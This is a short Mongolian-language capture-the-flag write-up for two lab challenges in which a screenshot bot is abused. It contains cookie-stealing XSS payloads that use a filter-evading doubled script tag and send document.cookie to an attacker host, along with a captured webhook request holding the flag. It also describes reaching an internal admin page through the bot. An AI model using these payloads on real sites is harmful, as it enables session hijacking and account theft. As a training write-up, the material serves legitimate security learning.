## Асаах

Docker desktop version биш docker engine  суулгаарай. 

```console
[root@localhost HZ2021]# docker --version
Docker version 20.10.10, build b485636
[root@localhost HZ2021]# docker-compose up -d
```


## Screenshot-1

`http://ipaddress/1337:/feed.php`
XSS өртөмтгий байх амархан шалгаж болно. 

```
<sscriptcript> new Image().src="http://<ATTACKERIP>:<port>/?"+document.cookie; </sscriptcript>
```

эсвэл
```
<sscriptcript>document.write('<img src="http://ATTACKERIP/?'+document.cookie+'" />')</sscriptcript>
```

ирсэн хүсэлтийг шалгавал


```
request: https://webhook.site/ef1e3938-3e7a-49e6-bac0-09cb98fbf017?c=PHPSESSID%3DHZ%7Bye%40h_admin_cook1e_and_fl%40g_0f_ScreenShot_1%7D
parameter:   	PHPSESSID=HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}

Headers
connection: close
host: 	webhook.site
accept-language: 	en,*
accept-encoding: 	gzip, deflate
accept: 	*/*
user-agent: 	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
referer:	http://screen/god-wisper.php
content-length: 	
content-type:	
```
flag
>HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}

## Screenshot-2
admin.php рүү хандвал Зөвхөн дотоод IP хандана уу гэсэн байх бөгөөд XSS ээр ирсэн хүсэлтийг анхааралтай харвал. 

**`referer:	http://screen/god-wisper.php`** гэж байгаа

`http://screen/` гэдэг нь docker ийн дотоод url хаяг гэж харж болохоор байна. иймд `http://screen/admin.php` -н screenshot -г харвал 

flag гарч ирнэ. 

![9d7c1f6f904b57a79b892e.jpg](9d7c1f6f904b57a79b892e.jpg)
